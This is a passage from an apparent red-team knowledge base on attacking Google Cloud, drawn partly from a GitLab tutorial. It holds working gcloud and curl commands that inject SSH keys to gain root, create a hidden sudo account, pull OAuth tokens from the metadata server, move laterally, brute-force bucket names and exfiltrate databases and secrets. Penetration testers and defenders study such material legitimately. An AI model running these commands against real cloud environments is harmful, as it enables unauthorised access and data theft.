AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob\n ...\n</code></pre> <p>Notice the slightly odd format of the public keys - the username is listed at the beginning (followed by a colon) and then again at the end. We'll need to match this format. Unlike normal SSH key operation, the username absolutely matters!</p> <p>Save the lines with usernames and keys in a new text file called <code>meta.txt</code>.</p> <p>Let's assume we are targeting the user <code>alice</code> from above. We'll generate a new key for ourselves like this:</p> <pre><code>$ ssh-keygen -t rsa -C \"alice\" -f ./key -P \"\" &amp;&amp; cat ./key.pub\n</code></pre> <p>Take the output of the command above and use it to add a line to the <code>meta.txt</code> file you create above, ensuring to add <code>alice:</code> to the beggining of your new public key.</p> <p><code>meta.txt</code> should now look something like this, including the existing keys and the new key you just generated:</p> <pre><code>alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice\nbob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob\nalice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice\n</code></pre> <p>Now, you can re-write the SSH key metadata for your instance with the following command:</p> <pre><code>$ gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt\n</code></pre> <p>You can now access a shell in the context of <code>alice</code> as follows:</p> <pre><code>lowpriv@instance:~$ ssh -i ./key alice@localhost\nalice@instance:~$ sudo id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","location":"gcp/exploitation/local-priv-esc-metadata/#add-ssh-key-to-existing-privileged-user"},{"title":"Create a new privileged user","text":"<p>No existing keys found when following the steps above? No one else interesting in <code>/etc/passwd</code> to target?</p> <p>You can follow the same process as above, but just make up a new username. This user will be created automatically and given rights to <code>sudo</code>. Scripted, the process would look like this:</p> <pre><code># define the new account username\nNEWUSER=\"definitelynotahacker\"\n\n# create a key\nssh-keygen -t rsa -C \"$NEWUSER\" -f ./key -P \"\"\n\n# create the input meta file\nNEWKEY=\"$(cat ./key.pub)\"\necho \"$NEWUSER:$NEWKEY\" &gt; ./meta.txt\n\n# update the instance metadata\ngcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt\n\n# ssh to the new account\nssh -i ./key \"$NEWUSER\"@localhost\n</code></pre>","location":"gcp/exploitation/local-priv-esc-metadata/#create-a-new-privileged-user"},{"title":"Grant sudo to existing session","text":"<p>This one is so easy, quick, and dirty that it feels wrong...</p> <pre><code>$ gcloud compute ssh [INSTANCE NAME]\n</code></pre> <p>This will generate a new SSH key, add it to your existing user, and add your existing username to the <code>google-sudoers</code> group, and start a new SSH session. While it is quick and easy, it may end up making more changes to the target system than the previous methods.</p> <p>We'll talk about this again for lateral movement, but it works perfectly fine for local privilege escalation as well.</p>","location":"gcp/exploitation/local-priv-esc-metadata/#grant-sudo-to-existing-session"},{"title":"Using OS Login","text":"<p>OS Login is an alternative to managing SSH keys. It links a Google user or service account to a Linux identity, relying on IAM permissions to grant or deny access to Compute Instances.</p> <p>OS Login is enabled at the project or instance level using the metadata key of <code>enable-oslogin = TRUE</code>.</p> <p>OS Login with two-factor authentication is enabled in the same manner with the metadata key of <code>enable-oslogin-2fa = TRUE</code>.</p> <p>The following two IAM permissions control SSH access to instances with OS Login enabled. They can be applied at the project or instance level:</p> <ul> <li>roles/compute.osLogin (no sudo)</li> <li>roles/compute.osAdminLogin (has sudo)</li> </ul> <p>Unlike managing only with SSH keys, these permissions allow the administrator to control whether or not <code>sudo</code> is granted.</p> <p>If you're lucky, your service account has these permissions. You can simply run the <code>gcloud compute ssh [INSTANCE]</code> command to connect manually as the service account. Two-factor is only enforced when using user accounts, so that should not slow you down even if it is assigned as shown above.</p> <p>Similar to using SSH keys from metadata, you can use this strategy to escalate privileges locally and/or to access other Compute Instances on the network.</p>","location":"gcp/exploitation/local-priv-esc-metadata/#using-os-login"},{"title":"Client Credential Search Order","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>","location":"gcp/general-knowledge/client-credential-search-order/"},{"title":"Default service account token","text":"<p>The metadata server available to a given instance will provide any user/process on that instance with an OAuth token that is automatically used as the default credentials when communicating with Google APIs via the <code>gcloud</code> command.</p> <p>You can retrieve and inspect the token with the following curl command:</p> <pre><code>$ curl \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre> <p>Which will receive a response like the following:</p> <pre><code>{\n      \"access_token\":\"ya29.AHES6ZRN3-HlhAPya30GnW_bHSb_QtAS08i85nHq39HE3C2LTrCARA\",\n      \"expires_in\":3599,\n      \"token_type\":\"Bearer\"\n }\n</code></pre> <p>This token is the combination of the service account and access scopes assigned to the Compute Instance. So, even though your service account may have every IAM privilege imaginable, this particular OAuth token might be limited in the APIs it can communicate with due to access scopes.</p>","location":"gcp/general-knowledge/client-credential-search-order/#default-service-account-token"},{"title":"Application default credentials","text":"<p>As an alternative to first pulling a token from the metadata server, Google also has a strategy called Application Default Credentials. When using one of Google's official GCP client libraries, the code will automatically go searching for credentials to use in a defined order.</p> <p>The very first location it would check would be the source code itself. Developers can choose to statically point to a service account key file.</p> <p>The next is an environment variable called <code>GOOGLE_APPLICATION_CREDENTIALS</code>. This can be set to point to a service account key file. Look for the variable itself set in the context of a system account or for references to setting it in scripts and instance metadata.</p> <p>Finally, if neither of these are provided, the application will revert to using the default token provided by the metadata server as described in the section above.</p> <p>Finding the actual JSON file with the service account credentials is generally much more desirable than relying on the OAuth token on the metadata server. This is because the raw service account credentials can be activated without the burden of access scopes and without the short expiration period usually applied to the tokens.</p>","location":"gcp/general-knowledge/client-credential-search-order/#application-default-credentials"},{"title":"Default Account Information","text":"","location":"gcp/general-knowledge/default-account-names/"},{"title":"Service Accounts","text":"<p>Service accounts are similar to Azure Service Principals. They can allow for programmatic access but also abuse. </p> <p>Information on Service Accounts</p> <p>User-Created Service Account: <code>service-account-name@project-id.iam.gserviceaccount.com</code></p> <p>Using the format above, you can denote the following items:</p> <ul> <li><code>service-account-name</code>: This will tell you potentially what services this is for: <code>Bigtable-sa</code> or <code>compute-sa</code></li> <li><code>project-id</code>: This will be the project identifier that the service account is for. You can set your <code>gcloud</code> configuration to this <code>project-id</code>. It will be numerical typically.</li> </ul>","location":"gcp/general-knowledge/default-account-names/#service-accounts"},{"title":"Default Service Account filename permutations:","text":"<ul> <li><code>serviceaccount.json</code></li> <li><code>service_account.json</code></li> <li><code>sa-private-key.json</code></li> <li><code>service-account-file.json</code></li> </ul>","location":"gcp/general-knowledge/default-account-names/#default-service-account-filename-permutations"},{"title":"Application-Based Service Account:","text":"<ul> <li><code>project-id@appspot.gserviceaccount.com</code>: Ths would be <code>project-id</code> value for App Engine or anything leveraging App Engine.</li> <li><code>project-number-compute@developer.gserviceaccount.com</code>: This service account is for Compute Engine where the <code>project-number-compute</code> will be: <code>project-id</code>-<code>compute</code>. I.E. <code>1234567-compute</code>.</li> </ul>","location":"gcp/general-knowledge/default-account-names/#application-based-service-account"},{"title":"How to use Service Accounts","text":"<p>In a BASH (or equivalent) shell: <code>export GOOGLE_APPLICATION_CREDENTIALS=\"/home/user/Downloads/service-account-file.json\"</code></p>","location":"gcp/general-knowledge/default-account-names/#how-to-use-service-accounts"},{"title":"Hunting GCP Buckets","text":"<p>GCP Buckets are almost 100% identical to AWS S3 Buckets. </p> <p>Theory: This call is based on OpenStack; maybe most cloud environments will be the same.</p> <p>Using @digininja's CloudStorageFinder diff the following files:</p> <p><code>diff bucket_finder.rb google_finder.rb</code></p> <p>The main differences are the URLs:</p> <ul> <li>AWS Supports HTTP and HTTPS</li> <li><code>AWS S3</code> URLs: <code>http://s3-region.amazonaws.com</code>, i.e.: <code>http://s3-eu-west-1.amazonaws.com</code>.</li> <li>GCP Endpoint: <code>https://storage.googleapis.com</code></li> </ul> <p>How to find buckets using CloudStorageFinder:</p> <p>Create a wordlist with any name; in our example, it is <code>wordlist.txt</code>.</p> <p>$ <code>ruby google_finder.rb wordlist.txt</code></p>","location":"gcp/general-knowledge/gcp-buckets/"},{"title":"Metadata in Google Cloud Instances","text":"<p>Metadata can provide an attacker (or regular user) information about the compromised App Engine instance, such as its project ID, service accounts, and tokens used by those service accounts.  </p> <p>The metadata can be accessed by a regular HTTP GET request or cURL, sans any third-party client libraries by making a request to metadata.google.internal or 169.254.169.254.  </p> <p><pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text\" -H\n\"Metadata-Flavor: Google\"\n</code></pre> Note: If you are using your local terminal to attempt access, as opposed to Google's Web Console, you will need to add <code>169.254.169.254    metadata.google.internal</code> to your <code>/etc/hosts</code> file.</p>","location":"gcp/general-knowledge/metadata_in_google_cloud_instances/"},{"title":"Metadata Endpoints","text":"<p>For basic enumeration, an attacker can target.  <pre><code>http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n</code></pre> To view scope: <pre><code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H \"Metadata-Flavor: Google\"\n</code></pre> To view project metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre> To view instance metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre></p> <p>The following table is pulled from the Google Cloud Documentation</p>    Metadata Endpoint Description     <code>/computeMetadata/v1/project/numeric-project-id</code> The project number assigned to your project.   <code>/computeMetadata/v1/project/project-id</code> The project ID assigned to your project.   <code>/computeMetadata/v1/instance/zone</code> The zone the instance is running in.   <code>/computeMetadata/v1/instance/service-accounts/default/aliases</code>    <code>/computeMetadata/v1/instance/service-accounts/default/email</code> The default service account email assigned to your project.   <code>/computeMetadata/v1/instance/service-accounts/default/</code> Lists all the default service accounts for your project.   <code>/computeMetadata/v1/instance/service-accounts/default/scopes</code> Lists all the supported scopes for the default service accounts.   <code>/computeMetadata/v1/instance/service-accounts/default/token</code> Returns the auth token that can be used to authenticate your application to other Google Cloud APIs.","location":"gcp/general-knowledge/metadata_in_google_cloud_instances/#metadata-endpoints"},{"title":"Security and Constraints","text":"<p>GCP Resources are typically placed into Projects. Projects are a mix of resource groups in Azure and Accounts in AWS. Projects can be either non-hierarchical or completely hierarchical. An operator can place security constraints on these projects to provide a baseline security policy. There are also Organization-wide policy constraints that apply to every project.</p>","location":"gcp/general-knowledge/security-and-constraints/"},{"title":"Examples","text":"<p>From: Organizational Policy Constraints</p> <ul> <li>constraints/iam.disableServiceAccountCreation : This can disable the overall creation of service accounts. Equivalent to Service Principals in Azure.</li> <li>constraints/iam.disableServiceAccountKeyCreation : This constraint will disable the ability to create a service account key. This constraint would be helpful if you want service accounts but only want to use RSA-based authentication. </li> </ul> <p>There are specific policies that are not retroactive. We can use these to our advantage. </p> <ol> <li><code>constraints/compute.requireShieldedVm</code>: If a compute node is already created and exists without this constraint applied, then this constraint will not be retroactive. You must delete the object and re-create it for it to enforce shielded VMs. </li> <li> <p><code>constraints/compute.vmExternalIpAccess</code>: Consider the following scenario:</p> <ul> <li>Constraint is based on the following permutation: <code>projects/PROJECT_ID/zones/ZONE/instances/INSTANCE</code></li> <li>Constraint looks for the <code>name</code> of the machine in the <code>project</code> identifier specified in the specific <code>zone</code></li> <li>If you can boot a VM with this specific set of criteria, then you can have a machine with an External IP Address</li> <li>Machine cannot already exist.</li> <li><code>constraints/compute.vmCanIpForward</code>: Another Non Retroactive Setting. The machine must not exist before this setting is created. Once this is set, then machines will enforce this condition.</li> </ul> </li> </ol>","location":"gcp/general-knowledge/security-and-constraints/#examples"},{"title":"Security Concepts","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>What you can actually do from within a compromised instance is the resultant combination of service accounts, access scopes, and IAM permissions. These are described below.</p>","location":"gcp/general-knowledge/security-concepts/"},{"title":"Resource hierarchy","text":"<p>Google Cloud uses a Resource hierarchy that is similar, conceptually, to that of a traditional filesystem. This provides a logical parent/child workflow with specfic attachment points for policies and permissions.</p> <p>At a high level, it looks like this:</p> <pre><code>Organization\n--&gt; Folders\n  --&gt; Projects\n    --&gt; Resources\n</code></pre> <p>A virtual machine (called a Compute Instance) is a resource. This resource resides in a project, probably alongside other Compute Instances, storage buckets, etc.</p>","location":"gcp/general-knowledge/security-concepts/#resource-hierarchy"},{"title":"Service accounts","text":"<p>Virtual machine instances are usually assigned a service account. Every GCP project has a default service account, and this will be assigned to new Compute Instances unless otherwise specified. Administrators can choose to use either a custom account or no account at all. This service account can be used by any user or application on the machine to communicate with the Google APIs. You can run the following command to see what accounts are available to you:</p> <pre><code>$ gcloud auth list\n</code></pre> <p>Default service accounts will look like one of the following:</p> <pre><code>PROJECT_NUMBER-compute@developer.gserviceaccount.com\nPROJECT_ID@appspot.gserviceaccount.com\n</code></pre> <p>More savvy administrators will have configured a custom service account to use with the instance. This allows them to be more granular with permissions.</p> <p>A custom service account will look like this:</p> <pre><code>SERVICE_ACCOUNT_NAME@PROJECT_NAME.iam.gserviceaccount.com\n</code></pre> <p>If <code>gcloud auth list</code> returns multiple accounts available, something interesting is going on. You should generally see only the service account. If there is more than one, you can cycle through each using <code>gcloud config set account [ACCOUNT]</code> while trying the various tasks in this blog.</p>  <p>Info</p> <p>If you are looking for ways to bypass access scopes checkout: Bypassing access scopes</p>  <p>The service account on a GCP Compute Instance will use OAuth to communicate with the Google Cloud APIs. When access scopes are used, the OAuth token that is generated for the instance will have a scope limitation included. This defines what API endpoints it can authenticate to. It does NOT define the actual permissions.</p> <p>When using a custom service account, Google recommends that access scopes are not used and to rely totally on IAM. The web management portal actually enforces this, but access scopes can still be applied to instances using custom service accounts programatically.</p> <p>There are three options when setting an access scope on a VM instance: - Allow default access - All full access to all cloud APIs - Set access for each API</p> <p>You can see what scopes are assigned by querying the metadata URL. Here is an example from a VM with \"default\" access assigned:</p> <pre><code>$ curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \\\n    -H 'Metadata-Flavor:Google'\n\nhttps://www.googleapis.com/auth/devstorage.read_only\nhttps://www.googleapis.com/auth/logging.write\nhttps://www.googleapis.com/auth/monitoring.write\nhttps://www.googleapis.com/auth/servicecontrol\nhttps://www.googleapis.com/auth/service.management.readonly\nhttps://www.googleapis.com/auth/trace.append\n</code></pre> <p>The most interesting thing in the default scope is <code>devstorage.read_only</code>. This grants read access to all storage buckets in the project. This can be devastating, which of course is great for us as an attacker.</p> <p>Here is what you'll see from an instance with no scope limitations:</p> <pre><code>$ curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'\nhttps://www.googleapis.com/auth/cloud-platform\n</code></pre> <p>This <code>cloud-platform</code> scope is what we are really hoping for, as it will allow us to authenticate to any API function and leverage the full power of our assigned IAM permissions. It is also Google's recommendation as it forces administrators to choose only necessary permissions, and not to rely on access scopes as a barrier to an API endpoint.</p> <p>It is possible to encounter some conflicts when using both IAM and access scopes. For example, your service account may have the IAM role of <code>compute.instanceAdmin</code> but the instance you've breached has been crippled with the scope limitation of <code>https://www.googleapis.com/auth/compute.readonly</code>. This would prevent you from making any changes using the OAuth token that's automatically assigned to your instance.</p>","location":"gcp/general-knowledge/security-concepts/#service-accounts"},{"title":"Identify and access management (IAM)","text":"<p>IAM permissions are used for fine-grained access control. There are a lot of them. The permissions are bundled together using three types of roles:</p> <ul> <li>Primitive roles: Owner, Editor, and Viewer. These are the old-school way of doing things. The default service account in every project is assigned the Editor role. This is insecure and we love it.</li> <li>Predefined roles: These roles are managed by Google and are meant to be combinations of most-likely scenarios. One of our favorites is the <code>compute.instanceAdmin</code> role, as it allows for easy privilege escalation.</li> <li>Custom roles: This allows admins to group their own set of granular permissions.</li> </ul> <p>Individual permissions are bundled together into a role. A role is connected to a member (user or service account) in what Google calls a binding. Finally, this binding is applied at some level of the GCP hierarchy via a policy.</p> <p>This policy determines what actions are allowed - it is the intersection between accounts, permissions, resources, and (optionally) conditions.</p> <p>You can try the following command to specifically enumerate roles assigned to your service account project-wide in the current project:</p> <pre><code>$ PROJECT=$(curl http://metadata.google.internal/computeMetadata/v1/project/project-id \\\n    -H \"Metadata-Flavor: Google\" -s)\n$ ACCOUNT=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email \\\n    -H \"Metadata-Flavor: Google\" -s)\n$ gcloud projects get-iam-policy $PROJECT  \\\n    --flatten=\"bindings[].members\" \\\n    --format='table(bindings.role)' \\\n    --filter=\"bindings.members:$ACCOUNT\"\n</code></pre> <p>Don't worry too much if you get denied access to the command above. It's still possible to work out what you can do simply by trying to do it.</p> <p>More generally, you can shorten the command to the following to get an idea of the roles assigned project-wide to all members.</p> <pre><code>$ gcloud projects get-iam-policy [PROJECT-ID]\n</code></pre> <p>Or to see the IAM policy assigned to a single Compute Instance you can try the following.</p> <pre><code>$ gcloud compute instances get-iam-policy [INSTANCE] --zone [ZONE]\n</code></pre> <p>There are similar commands for various other APIs. Consult the documentation if you need one other than what is shown above.</p>","location":"gcp/general-knowledge/security-concepts/#identify-and-access-management-iam"},{"title":"Lateral Movement","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>You've compromised one VM inside a project. Great! Now let's get some more...</p> <p>You can try the following command to get a list of all instances in your current project:</p> <pre><code>$ gcloud compute instances list\n</code></pre>","location":"gcp/post_exploitation/lateral-movement/"},{"title":"SSH'ing around","text":"<p>You can use local privilege escalation tactics to move around to other machines.</p> <p>One way is to applying SSH keys at the project level, granting you permission to SSH into a privileged account for any instance that has not explicitly chosen the \"Block project-wide SSH keys\" option.</p> <p>After you've identified the strategy for selecting or creating a new user account, you can use the following syntax.</p> <pre><code>$ gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt\n</code></pre> <p>If you're really bold, you can also just type <code>gcloud compute ssh [INSTANCE]</code> to use your current username on other boxes.</p>","location":"gcp/post_exploitation/lateral-movement/#sshing-around"},{"title":"Abusing networked services","text":"","location":"gcp/post_exploitation/lateral-movement/#abusing-networked-services"},{"title":"Some GCP networking tidbits","text":"<p>Compute Instances are connected to networks called VPCs or Virtual Private Clouds. GCP firewall rules are defined at this network level but are applied individually to a Compute Instance. Every network, by default, has two implied firewall rules: allow outbound and deny inbound.</p> <p>Each GCP project is provided with a VPC called <code>default</code>, which applies the following rules to all instances:</p> <ul> <li>default-allow-internal (allow all traffic from other instances on the <code>default</code> network)</li> <li>default-allow-ssh (allow 22 from everywhere)</li> <li>default-allow-rdp (allow 3389 from everywhere)</li> <li>default-allow-icmp (allow ping from everywhere)</li> </ul>","location":"gcp/post_exploitation/lateral-movement/#some-gcp-networking-tidbits"},{"title":"Meet the neighbors","text":"<p>Firewall rules may be more permissive for internal IP addresses. This is especially true for the default VPC, which permits all traffic between Compute Instances.</p> <p>You can get a nice readable view of all the subnets in the current project with the following command:</p> <pre><code>$ gcloud compute networks subnets list\n</code></pre> <p>And an overview of all the internal/external IP addresses of the Compute Instances using the following:</p> <pre><code>$ gcloud compute instances list\n</code></pre> <p>If you go crazy with nmap from a Compute Instance, Google will notice and will likely send an alert email to the project owner. This is more likely to happen if you are scanning public IP addresses outside of your current project. Tread carefully.</p>","location":"gcp/post_exploitation/lateral-movement/#meet-the-neighbors"},{"title":"Enumerating public ports","text":"<p>Perhaps you've been unable to leverage your current access to move through the project internally, but you DO have read access to the compute API. It's worth enumerating all the instances with firewall ports open to the world - you might find an insecure application to breach and hope you land in a more powerful position.</p> <p>In the section above, you've gathered a list of all the public IP addresses. You could run nmap against them all, but this may taken ages and could get your source IP blocked.</p> <p>When attacking from the internet, the default rules don't provide any quick wins on properly configured machines. It's worth checking for password authentication on SSH and weak passwords on RDP, of course, but that's a given.</p> <p>What we are really interested in is other firewall rules that have been intentionally applied to an instance. If we're lucky, we'll stumble over an insecure application, an admin interface with a default password, or anything else we can exploit.</p> <p>Firewall rules can be applied to instances via the following methods:</p> <ul> <li>Network tags</li> <li>Service accounts</li> <li>All instances within a VPC</li> </ul> <p>Unfortunately, there isn't a simple <code>gcloud</code> command to spit out all Compute Instances with open ports on the internet. You have to connect the dots between firewall rules, network tags, services accounts, and instances.</p> <p>The GitLab Red Team has automated this completely using this python script which will export the following:</p> <ul> <li>CSV file showing instance, public IP, allowed TCP, allowed UDP</li> <li>nmap scan to target all instances on ports ingress allowed from the public internet (0.0.0.0/0)</li> <li>masscan to target the full TCP range of those instances that allow ALL TCP ports from the public internet (0.0.0.0/0)</li> </ul> <p>Full documentation on that tool is availabe in the README.</p>","location":"gcp/post_exploitation/lateral-movement/#enumerating-public-ports"},{"title":"Treasure hunting","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>As hackers, we want a root shell. Just because. But in the real world, what matters is acquiring digital assets - not escalating privileges. While a root shell may help us get there, it's not always required. The following sections detail tactics to view and exfiltrate data from various Google services.</p> <p>If you have been unable to achieve any type of privilege escalation thus far, it is quite likely that working through the following sections will help you uncover secrets that can be used again in earlier steps, finally giving you that sweet root shell you so desire.</p>","location":"gcp/post_exploitation/treasure_hunting/"},{"title":"Accessing databases","text":"<p>Most great breaches involve a database of one type or another. You should follow traditional methods inside your compromised instance to enumerate, access, and exfiltrate data from any that you encounter.</p> <p>In addition to the traditional stuff, though, Google has a handful of database technologies that you may have access to via the default service account or another set of credentials you have compromised thus far.</p> <p>If you've granted yourself web console access, that may be the easiest way to explore. Details on working with every database type in GCP would require another long blog post, but here are some <code>gcloud</code> documentation areas you might find useful:</p> <ul> <li>Cloud SQL</li> <li>Cloud Spanner</li> <li>Cloud Bigtable</li> <li>Cloud Firestore</li> <li>Firebase</li> </ul> <p>You may get lucky and discover ready-to-go backups of your target database when enumerating storage buckets. Otherwise, each database type provides various <code>gcloud</code> commands to export the data. This typically involves writing the database to a cloud storage bucket first, which you can then download. It may be best to use an existing bucket you already have access to, but you can also create your own if you want.</p> <p>As an example, you can follow Google's documentation to exfiltrate a Cloud SQL database.</p> <p>The following commands may be useful to help you identify database targets across the project.</p> <pre><code># Cloud SQL\n$ gcloud sql instances list\n$ gcloud sql databases list --instance [INSTANCE]\n\n# Cloud Spanner\n$ gcloud spanner instances list\n$ gcloud spanner databases list --instance [INSTANCE]\n\n# Cloud Bigtable\n$ gcloud bigtable instances list\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#accessing-databases"},{"title":"Enumerating storage buckets","text":"<p>We all love stumbling across open storage buckets, but finding them usually requires brute forcing massive wordlists or just getting lucky and tripping over them in source code. As shown in the \"access scopes\" section above, default configurations permit read access to storage. This means that your shell can now enumerate ALL storage buckets in the project, including listing and accessing the contents inside.</p> <p>This can be a MAJOR vector for privilege escalation, as those buckets can contain secrets.</p> <p>The following commands will help you explore this vector:</p> <pre><code># List all storage buckets in project\n$ gsutil ls\n\n# Get detailed info on all buckets in project\n$ gsutil ls -L\n\n# List contents of a specific bucket (recursive, so careful!)\n$ gsutil ls -r gs://bucket-name/\n\n# Cat the context of a file without copying it locally\n$ gsutil cat gs://bucket-name/folder/object\n\n# Copy an object from the bucket to your local storage for review\n$ gsutil cp gs://bucket-name/folder/object ~/\n</code></pre> <p>If your initial <code>gsutil ls</code> command generates a permission denied error, you may still have access to buckets - you just need to know their names first. Hopefully you've explored enough to get a feel for naming conventions in the project, which will assist in brute-forcing.</p> <p>You can use a simple bash loop like the following to work through a wordlist. You should create a targeted wordlist based on the environment, as this command will essentially look for buckets from any customer.</p> <pre><code>$ for i in $(cat wordlist.txt); do gsutil ls -r gs://\"$i\"; done\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#enumerating-storage-buckets"},{"title":"Decrypting secrets with crypto keys","text":"<p>Cloud Key Management Service is a repository for storing cryptographic keys, such as those used to encrypt and decrypt sensitive files. Individual keys are stored in key rings, and granular permissions can be applied at either level. An [API is available] for key management and easy encryption/decryption of objects stored in Google storage.</p> <p>If you're lucky, the service account assigned to your breached instance has access to some keys. Perhaps you've even noticed some encrypted files while rummaging through buckets.</p> <p>It's possible that you have access to decryption keys but don't have the permissions required to figure out what those keys are. If you encounter encrypted files, it is worthwhile trying to find documentation, scripts, or bash history somewhere to figure out the required arguments for the command below.</p> <p>Assuming you do have permission to enumerate, the process looks like this. Below we're assuming that all keys were made available globally, but it's possible there are keys pinned to specific regions only.</p> <pre><code># List the global keyrings available\n$ gcloud kms keyrings list --location global\n\n# List the keys inside a keyring\n$ gcloud kms keys list --keyring [KEYRING NAME] --location global\n\n# Decrypt a file using one of your keys\n$ gcloud kms decrypt --ciphertext-file=[INFILE] \\\n    --plaintext-file=[OUTFILE] \\\n    --key [KEY] \\\n    --keyring [KEYRING] \\\n    --location global\n</code></pre>","location":"gcp/post_exploitation/treasure_hunting/#decrypting-secrets-with-crypto-keys"},{"title":"Querying custom metadata","text":"<p>Administrators can add custom metadata at the instance and project level. This is simply a way to pass arbitrary key/value pairs into an instance, and is commonly used for environment variables and startup/shutdown scripts.</p> <p>If you followed the steps above, you've already queried the metadata endpoint for all available information. This would have included any custom metadata. You can also use the following commands to view it on its own:</p> <pre><code># view project metadata\n$ curl \"http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n\n# view instance metadata\n$ curl \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre> <p>Maybe you'll get lucky and find something juicy.</p>","location":"gcp/post_exploitation/treasure_hunting/#querying-custom-metadata"},{"title":"Reviewing serial console logs","text":"<p>By default, compute instances write output from the OS and BIOS to serial ports. Google provides a couple of ways to view these log files. The first is via the compute API and can be executed even via the restrictive \"Compute: Read Only\" access scope.</p> <p>Serial console logs may expose sensitive information from the system logs, which a low-privilege shell on a compute instance may not have access to view. However, you might be able to bypass this restriction if the instance is bound to a service account with the appropriate rights. If these rights are granted project-wide, you'll be able to view the logs on all compute instances, possibly providing information required to move laterally to other instances.</p> <p>You can use the following gcloud command to query the serial port logs:</p> <pre><code>gcloud compute instances get-serial-port-output instance-name \\\n  --port port \\\n  --start start \\\n  --zone zone\n</code></pre> <p>In addition, serial port logs may be stored to Cloud Logging, if enabled by an administrator. If you've gained access to read permissions for logging, this may be an alternative method to view this information. Read the \"Reviewing Stackdriver logging\" section for more info.</p>","location":"gcp/post_exploitation/treasure_hunting/#reviewing-serial-console-logs"},{"title":"Reviewing custom images","text":"<p>Custom compute images may contain sensitive details or other vulnerable configurations that you can exploit. You can query the list of non-standard images in a project with the following command:</p> <pre><code>$ gcloud compute images list 